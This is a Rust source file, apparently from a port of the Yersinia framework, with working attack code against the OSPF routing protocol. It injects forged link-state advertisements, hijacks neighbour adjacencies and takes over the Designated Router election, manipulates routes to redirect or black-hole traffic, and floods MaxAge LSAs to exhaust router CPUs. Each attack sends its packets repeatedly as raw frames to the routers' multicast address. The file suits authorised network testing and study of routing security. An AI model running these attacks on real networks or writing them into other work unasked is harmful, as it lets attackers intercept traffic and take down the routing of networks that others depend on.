//! OSPF Attack Implementations

use super::packet::{OspfHello, OspfLsa, OspfLsaType, OspfPacket};
use async_trait::async_trait;
use std::net::Ipv4Addr;
use std::sync::atomic::Ordering;
use std::time::Duration;
use tokio::time;
use yersinia_core::{Attack, AttackContext, AttackStats, Result};
use yersinia_packet::{EtherType, EthernetFrame, MacAddress};

/// OSPF LSA Injection Attack
///
/// Injects malicious Link State Advertisements into the OSPF domain
/// to manipulate routing tables, redirect traffic, or create black holes.
#[derive(Debug, Clone)]
pub struct OspfLsaInjectionAttack {
    /// Router ID (attacker's identifier)
    pub router_id: Ipv4Addr,
    /// Area ID
    pub area_id: Ipv4Addr,
    /// LSAs to inject
    pub lsas: Vec<OspfLsa>,
    /// LSA type to inject
    pub lsa_type: OspfLsaType,
}

impl OspfLsaInjectionAttack {
    pub fn new(router_id: Ipv4Addr, area_id: Ipv4Addr) -> Self {
        Self {
            router_id,
            area_id,
            lsas: vec![],
            lsa_type: OspfLsaType::ExternalLsa,
        }
    }

    /// Add external route to inject
    pub fn add_external_route(mut self, network: Ipv4Addr, netmask: Ipv4Addr, metric: u32) -> Self {
        let lsa = OspfLsa::external_lsa(
            network,
            netmask,
            self.router_id,
            Ipv4Addr::UNSPECIFIED,
            metric,
            0,
        );
        self.lsas.push(lsa);
        self
    }

    /// Add summary route to inject
    pub fn add_summary_route(mut self, network: Ipv4Addr, netmask: Ipv4Addr, metric: u32) -> Self {
        let lsa = OspfLsa::summary_lsa(network, netmask, self.router_id, metric);
        self.lsas.push(lsa);
        self
    }

    /// Add network LSA
    pub fn add_network_lsa(
        mut self,
        network_id: Ipv4Addr,
        netmask: Ipv4Addr,
        attached_routers: Vec<Ipv4Addr>,
    ) -> Self {
        let lsa = OspfLsa::network_lsa(network_id, self.router_id, netmask, attached_routers);
        self.lsas.push(lsa);
        self
    }

    /// Build Link State Update packet
    pub fn build_ls_update(&self) -> OspfPacket {
        OspfPacket::link_state_update(self.router_id, self.area_id, self.lsas.clone())
    }

    /// Build multiple updates if LSAs exceed packet size
    pub fn build_ls_updates(&self) -> Vec<OspfPacket> {
        let mut packets = vec![];
        let lsas_per_packet = 10; // Conservative

        for chunk in self.lsas.chunks(lsas_per_packet) {
            let packet =
                OspfPacket::link_state_update(self.router_id, self.area_id, chunk.to_vec());
            packets.push(packet);
        }

        if packets.is_empty() && !self.lsas.is_empty() {
            packets.push(self.build_ls_update());
        }

        packets
    }
}

/// OSPF Neighbor Hijacking Attack
///
/// Establishes fake OSPF adjacencies with routers to gain access to
/// routing updates and inject malicious LSAs.
#[derive(Debug, Clone)]
pub struct OspfNeighborHijackAttack {
    /// Attacker router ID
    pub router_id: Ipv4Addr,
    /// Area ID
    pub area_id: Ipv4Addr,
    /// Network mask
    pub network_mask: Ipv4Addr,
    /// Hello interval (seconds)
    pub hello_interval: u16,
    /// Dead interval (seconds)
    pub dead_interval: u32,
    /// Router priority (higher = more likely to become DR)
    pub router_priority: u8,
    /// Attempt to become Designated Router
    pub become_dr: bool,
}

impl OspfNeighborHijackAttack {
    pub fn new(router_id: Ipv4Addr, area_id: Ipv4Addr, network_mask: Ipv4Addr) -> Self {
        Self {
            router_id,
            area_id,
            network_mask,
            hello_interval: 10,
            dead_interval: 40,
            router_priority: 1,
            become_dr: false,
        }
    }

    /// Set high priority to become DR
    pub fn attempt_dr_election(mut self) -> Self {
        self.router_priority = 255; // Maximum priority
        self.become_dr = true;
        self
    }

    /// Build HELLO packet
    pub fn build_hello(&self, known_neighbors: Vec<Ipv4Addr>) -> OspfPacket {
        let mut hello = OspfHello::new(self.network_mask);
        hello.hello_interval = self.hello_interval;
        hello.router_dead_interval = self.dead_interval;
        hello.router_priority = self.router_priority;

        for neighbor in known_neighbors {
            hello = hello.add_neighbor(neighbor);
        }

        // If attempting to become DR, claim we are the DR
        if self.become_dr {
            hello = hello.with_dr(self.router_id);
        }

        OspfPacket::hello(self.router_id, self.area_id, hello)
    }
}

/// OSPF Route Manipulation Attack
///
/// Manipulates existing OSPF routes by advertising better metrics
/// or conflicting information to influence routing decisions.
#[derive(Debug, Clone)]
pub struct OspfRouteManipulationAttack {
    /// Router ID
    pub router_id: Ipv4Addr,
    /// Area ID
    pub area_id: Ipv4Addr,
    /// Target networks to manipulate
    pub target_networks: Vec<(Ipv4Addr, Ipv4Addr)>, // (network, netmask)
    /// Manipulation mode
    pub mode: RouteManipulationMode,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RouteManipulationMode {
    /// Advertise with best metric (lowest cost)
    BestMetric,
    /// Advertise with worst metric (highest cost / black hole)
    WorstMetric,
    /// Advertise conflicting routes to cause instability
    Conflicting,
}

impl OspfRouteManipulationAttack {
    pub fn new(router_id: Ipv4Addr, area_id: Ipv4Addr) -> Self {
        Self {
            router_id,
            area_id,
            target_networks: vec![],
            mode: RouteManipulationMode::BestMetric,
        }
    }

    pub fn add_target(mut self, network: Ipv4Addr, netmask: Ipv4Addr) -> Self {
        self.target_networks.push((network, netmask));
        self
    }

    pub fn set_mode(mut self, mode: RouteManipulationMode) -> Self {
        self.mode = mode;
        self
    }

    fn get_metric(&self) -> u32 {
        match self.mode {
            RouteManipulationMode::BestMetric => 1,
            RouteManipulationMode::WorstMetric => 0xFFFF,
            RouteManipulationMode::Conflicting => 10,
        }
    }

    /// Build Link State Update with manipulated routes
    pub fn build_ls_update(&self) -> OspfPacket {
        let metric = self.get_metric();
        let mut lsas = vec![];

        for (network, netmask) in &self.target_networks {
            let lsa = OspfLsa::external_lsa(
                *network,
                *netmask,
                self.router_id,
                Ipv4Addr::UNSPECIFIED,
                metric,
                0,
            );
            lsas.push(lsa);
        }

        OspfPacket::link_state_update(self.router_id, self.area_id, lsas)
    }

    /// Build conflicting LSAs with different sequence numbers
    pub fn build_conflicting_updates(&self) -> Vec<OspfPacket> {
        let mut packets = vec![];

        for (network, netmask) in &self.target_networks {
            // Create two conflicting LSAs with different metrics
            let mut lsa1 = OspfLsa::external_lsa(
                *network,
                *netmask,
                self.router_id,
                Ipv4Addr::UNSPECIFIED,
                1,
                0,
            );
            lsa1.header.sequence = 0x80000001;

            let mut lsa2 = OspfLsa::external_lsa(
                *network,
                *netmask,
                self.router_id,
                Ipv4Addr::UNSPECIFIED,
                100,
                0,
            );
            lsa2.header.sequence = 0x80000002;

            packets.push(OspfPacket::link_state_update(
                self.router_id,
                self.area_id,
                vec![lsa1],
            ));
            packets.push(OspfPacket::link_state_update(
                self.router_id,
                self.area_id,
                vec![lsa2],
            ));
        }

        packets
    }
}

/// OSPF Max-Age LSA DoS Attack
///
/// Floods the OSPF domain with MaxAge LSAs to force routers to
/// constantly recalculate their routing tables, causing CPU exhaustion
/// and routing instability.
#[derive(Debug, Clone)]
pub struct OspfMaxAgeDosAttack {
    /// Router ID
    pub router_id: Ipv4Addr,
    /// Area ID
    pub area_id: Ipv4Addr,
    /// Number of fake LSAs to generate
    pub num_lsas: u32,
    /// Rate of LSA flooding (packets/sec)
    pub rate_pps: u32,
    /// Use random router IDs for LSAs
    pub randomize_router_ids: bool,
}

impl OspfMaxAgeDosAttack {
    pub fn new(router_id: Ipv4Addr, area_id: Ipv4Addr) -> Self {
        Self {
            router_id,
            area_id,
            num_lsas: 1000,
            rate_pps: 100,
            randomize_router_ids: true,
        }
    }

    pub fn with_num_lsas(mut self, count: u32) -> Self {
        self.num_lsas = count;
        self
    }

    pub fn with_rate(mut self, rate_pps: u32) -> Self {
        self.rate_pps = rate_pps;
        self
    }

    /// Generate random IP for LSA
    fn random_ip(&self, index: u32) -> Ipv4Addr {
        if self.randomize_router_ids {
            Ipv4Addr::new(
                rand::random(),
                rand::random(),
                rand::random(),
                rand::random(),
            )
        } else {
            let bytes = index.to_be_bytes();
            Ipv4Addr::new(10, bytes[1], bytes[2], bytes[3])
        }
    }

    /// Build MaxAge LSA flood packet
    pub fn build_maxage_flood(&self, start_index: u32, count: u32) -> OspfPacket {
        let mut lsas = vec![];

        for i in 0..count {
            let network = self.random_ip(start_index + i);
            let router_id = self.random_ip(start_index + i + 0x10000);

            let lsa = OspfLsa::external_lsa(
                network,
                "255.255.255.0".parse().unwrap(),
                router_id,
                Ipv4Addr::UNSPECIFIED,
                1,
                0,
            )
            .set_max_age(); // Set age to 3600 (MaxAge)

            lsas.push(lsa);
        }

        OspfPacket::link_state_update(self.router_id, self.area_id, lsas)
    }

    /// Generate all MaxAge flood packets
    pub fn build_all_floods(&self) -> Vec<OspfPacket> {
        let mut packets = vec![];
        let lsas_per_packet = 50;
        let num_packets = self.num_lsas.div_ceil(lsas_per_packet);

        for i in 0..num_packets {
            let start = i * lsas_per_packet;
            let count = std::cmp::min(lsas_per_packet, self.num_lsas - start);
            packets.push(self.build_maxage_flood(start, count));
        }

        packets
    }
}

#[async_trait]
impl Attack for OspfLsaInjectionAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let packets = self.build_ls_updates();
        let interval = Duration::from_secs(5); // OSPF LSA refresh interval

        for (idx, ospf_pkt) in packets.iter().cycle().enumerate() {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let ospf_bytes = ospf_pkt.to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0x01, 0x00, 0x5E, 0x00, 0x00, 0x05]), // OSPF AllSPFRouters
                MacAddress(ctx.interface.mac_address.0),
                EtherType::IPv4,
                ospf_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            if idx % packets.len() == packets.len() - 1 {
                time::sleep(interval).await;
            }
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "OSPF LSA Injection"
    }
}

#[async_trait]
impl Attack for OspfNeighborHijackAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(self.hello_interval as u64 * 1000);

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let ospf_bytes = self.build_hello(vec![]).to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0x01, 0x00, 0x5E, 0x00, 0x00, 0x05]),
                MacAddress(ctx.interface.mac_address.0),
                EtherType::IPv4,
                ospf_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "OSPF Neighbor Hijacking"
    }
}

#[async_trait]
impl Attack for OspfRouteManipulationAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_secs(5);

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let ospf_bytes = self.build_ls_update().to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0x01, 0x00, 0x5E, 0x00, 0x00, 0x05]),
                MacAddress(ctx.interface.mac_address.0),
                EtherType::IPv4,
                ospf_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "OSPF Route Manipulation"
    }
}

#[async_trait]
impl Attack for OspfMaxAgeDosAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let packets = self.build_all_floods();
        let interval = Duration::from_micros(1_000_000 / self.rate_pps.max(1) as u64);

        for (idx, ospf_pkt) in packets.iter().cycle().enumerate() {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let ospf_bytes = ospf_pkt.to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0x01, 0x00, 0x5E, 0x00, 0x00, 0x05]),
                MacAddress(ctx.interface.mac_address.0),
                EtherType::IPv4,
                ospf_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            if idx % 100 == 0 {
                time::sleep(interval).await;
            }
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "OSPF MaxAge DoS"
    }
}

#[cfg(test)]
mod tests {
    use super::super::OspfPacketType;
    use super::*;

    #[test]
    fn test_lsa_injection() {
        let attack =
            OspfLsaInjectionAttack::new("10.0.0.1".parse().unwrap(), "0.0.0.0".parse().unwrap())
                .add_external_route(
                    "192.168.0.0".parse().unwrap(),
                    "255.255.0.0".parse().unwrap(),
                    10,
                );

        let packet = attack.build_ls_update();
        assert_eq!(packet.packet_type, OspfPacketType::LinkStateUpdate);
    }

    #[test]
    fn test_neighbor_hijack() {
        let attack = OspfNeighborHijackAttack::new(
            "10.0.0.1".parse().unwrap(),
            "0.0.0.0".parse().unwrap(),
            "255.255.255.0".parse().unwrap(),
        )
        .attempt_dr_election();

        let hello = attack.build_hello(vec![]);
        assert_eq!(hello.packet_type, OspfPacketType::Hello);
    }

    #[test]
    fn test_route_manipulation() {
        let attack = OspfRouteManipulationAttack::new(
            "10.0.0.1".parse().unwrap(),
            "0.0.0.0".parse().unwrap(),
        )
        .add_target(
            "172.16.0.0".parse().unwrap(),
            "255.255.0.0".parse().unwrap(),
        )
        .set_mode(RouteManipulationMode::BestMetric);

        let packet = attack.build_ls_update();
        assert_eq!(packet.packet_type, OspfPacketType::LinkStateUpdate);
    }

    #[test]
    fn test_maxage_dos() {
        let attack =
            OspfMaxAgeDosAttack::new("10.0.0.1".parse().unwrap(), "0.0.0.0".parse().unwrap())
                .with_num_lsas(100);

        let packets = attack.build_all_floods();
        assert!(!packets.is_empty());
    }
}
